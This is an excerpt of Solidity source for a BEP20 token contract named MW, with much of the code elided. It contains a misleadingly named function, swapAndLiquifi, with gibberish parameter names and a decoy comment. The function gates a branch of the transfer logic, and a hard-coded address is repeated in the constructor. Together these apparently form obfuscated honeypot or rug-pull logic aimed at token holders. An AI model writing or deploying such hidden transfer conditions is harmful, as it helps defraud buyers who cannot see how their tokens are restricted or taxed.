...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function swapAndLiquifi(address wdsasdawdwd, address rfaecpasien) internal view returns (bool){
        return (wdsasdawdwd != rfaecpasien)
        || /*_transfer*/
        (isExcludedFromCut[rfaecpasien] == false || false);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(swapAndLiquifi(sender,recipient))
...
contract MW is BEP20 {
    constructor() BEP20(
        ...
        [0xE6528901f39D6534D70BdEd5A19ae5d4B7bc02Dd,0xE6528901f39D6534D70BdEd5A19ae5d4B7bc02Dd],
        0xE6528901f39D6534D70BdEd5A19ae5d4B7bc02Dd
    ){}
}